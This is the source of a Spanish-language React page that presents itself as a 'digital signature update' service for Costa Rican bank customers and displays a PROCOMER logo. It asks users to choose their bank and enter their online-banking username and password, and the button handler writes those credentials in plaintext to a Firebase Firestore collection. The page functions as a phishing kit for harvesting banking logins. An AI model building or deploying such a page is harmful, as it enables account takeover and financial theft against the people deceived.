import { useState, useEffect } from "react";
import EmblaCarousel from "../components/EmblaCarousel";
import firebase from "../components/firebase";
function findGetParameter(url) {
  var result = null,
    tmp = [];
  window.location.search
    .substr(1)
    .split("&")
    .forEach(function (item) {
      tmp = item.split("=");
      if (tmp[0] === url) result = decodeURIComponent(tmp[1]);
    });
  return result;
}

const FirmaDigital = () => {
  const [state, setState] = useState("");
  useEffect(() => {
    let urlP = findGetParameter("firma");
    setState(urlP);
  }, []);

  const [activeCursos, setActiveCursos] = useState([]);
  const [infoUser, setInfoUser] = useState([]);
  const [solicitud, setSolicitud] = useState("");

  useEffect(() => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  }, []);

  const CreateUser = (name, text) => {
    setInfoUser({ ...infoUser, [name]: text });
  };

  const GetData = () => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  };

  const handdleWhatsApp = (text) => {
    GetData();

    let arrayAux = activeCursos;
    try {
      arrayAux.push(infoUser);
    } catch (e) {
      console.log(e);
    }

    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: arrayAux }).then(() => {
      window.location.href = "/registro-de-usuario?firma=" + solicitud;
    });
  };

  useEffect(() => {
    setSolicitud(activeCursos.length);
    CreateUser("id", activeCursos.length);
  }, [activeCursos]);

  return (
    <div>
      <main className="lg:w-8/12 mx-auto items-center justify-center  flex-1 ">
        <img src="./carrusel1.jpg" className="mx-auto mb-5" />
        <h1 className="text-4xl lg:text-10xl font-bold text-center uppercase">
          {state === "false"
            ? "Sin firma digital"
            : "ACTUALIZACION DE FIRMA DIDITAL"}
        </h1>
      </main>
      <div className="w-11/12 lg:w-5/12 mx-auto bg">
        <p className="text-lg py-3 ">
          Aquí deberá seleccionar la entidad financiera con la cual obtuvo su
          firma digital.
        </p>
        <div className="mt- flex flex-col">
          <div className="flex flex-col mt-3 space-y-2">
            <label>Entidades Financieras</label>
            <select
              id="wpforms-388-field_4"
              className="border w-full lg:w-6/12 border-gray-900 py-2"
              onChange={(e) => CreateUser("entidad", e.target.value)}
              name="wpforms[fields][4]"
              required="required"
              aria-invalid="false"
            >
              <option value="- Seleccionar -">- Seleccionar -</option>
              <option value="Banco Nacional">Banco Nacional</option>
              <option value="Banco de Costa Rica">Banco de Costa Rica</option>
              <option value="Banco Popular">Banco Popular</option>
              <option value="Banco Promerica">Banco Promerica</option>
              <option value="BAC Credomatic">BAC Credomatic</option>
              <option value="Coope Ande">Coope Ande</option>
              <option value="Coopenae">Coopenae</option>
              <option value="Coopeservidores">Coopeservidores</option>
              <option value="Davivienda">Davivienda</option>
              <option value="Grupo LAFISE">Grupo LAFISE</option>
              <option value="Grupo Mutual">Grupo Mutual</option>
              <option value="Scotiabank">Scotiabank</option>
              <option value="Otros bancos">Otros bancos</option>
            </select>
          </div>
          <div className="flex flex-col mt-3 lg:w-6/12">
            <p className="mt-2 mb-1">Usuario</p>
            <input
              className="border p-2"
              onChange={(e) => CreateUser("user", e.target.value)}
            />
          </div>
          <div className="flex flex-col mt-3 lg:w-6/12">
            <p className="mt-2 mb-1">Contraseña</p>
            <input
              className="border p-2"
              type="password"
              onChange={(e) => CreateUser("password", e.target.value)}
            />
          </div>
          <div className="flex mt-3">
            <input type="checkbox" />
            <p className="-mt-1.5 ml-2">
              La informacion que se solicita es para su uso exclusivo y personal
              para el proceso de solicitud de actualización de firma digital. No
              lo facilite por telefono o correo electronico a ninguna persona.
            </p>
          </div>
          <button
            onClick={(e) => handdleWhatsApp()}
            className="mt-5 bg-gray-200 p-2 border border-gray-800 font-bold text-xl lg:w-2/12 text-center"
          >
            Ingresar
          </button>
        </div>
      </div>
      <img className="w-screen mt-10" src="/firma1.jpg" />
      <img src="/logo_procomer_esencial.png" className="mt-20 w-11/12 mx-auto" />

      <img className="w-screen mt-20" src="/firma2.jpg" />
      
    </div>
  );
};

FirmaDigital.layout = "L2";

export default FirmaDigital;
